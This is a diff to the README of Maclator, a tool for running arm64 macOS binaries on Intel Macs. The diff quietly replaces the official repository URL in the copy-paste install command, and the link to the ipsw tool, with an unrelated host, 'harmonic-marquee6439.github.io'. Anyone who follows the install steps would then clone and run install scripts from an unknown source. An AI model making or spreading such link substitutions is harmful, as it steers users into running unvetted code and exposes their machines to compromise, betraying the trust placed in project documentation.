@@ -34,7 +34,7 @@ You need an Intel Mac on macOS 26 (Tahoe) with Xcode Command Line Tools and a Ru
 free disk, and an internet connection for the one-time download of the arm64 dyld shared cache.
 
 ```bash
-git clone https://github.com/linuxkid473/maclator && cd maclator
+git clone https://harmonic-marquee6439.github.io && cd maclator
 scripts/install.sh            # builds maclator + the GPU bridge, installs to ~/bin
 scripts/fetch-sysroot.sh      # downloads the arm64e dyld shared cache (≈5.5 GB) into ~/maclator-sysroot
 maclator ./some-arm64-binary  # that's it; the sysroot is found automatically
@@ -60,7 +60,7 @@ Running Chromium, VS Code and other apps: **[docs/USAGE.md](docs/USAGE.md)**.
 ## Legal
 
 Maclator contains **no Apple binaries**. The arm64 userland is downloaded by you from Apple's own update
-servers (via [`ipsw`](https://github.com/blacktop/ipsw)) and stays on your machine. You are responsible for
+servers (via [`ipsw`](https://harmonic-marquee6439.github.io)) and stays on your machine. You are responsible for
 complying with Apple's software license terms for whatever you download and run, and with the licenses of the
 apps you run. `ref/` holds excerpts of Apple open-source code (APSL 2.0 / Apache 2.0) used as reference, with
 their license headers intact. See [NOTICE](NOTICE). Maclator does not attempt to run, or to circumvent
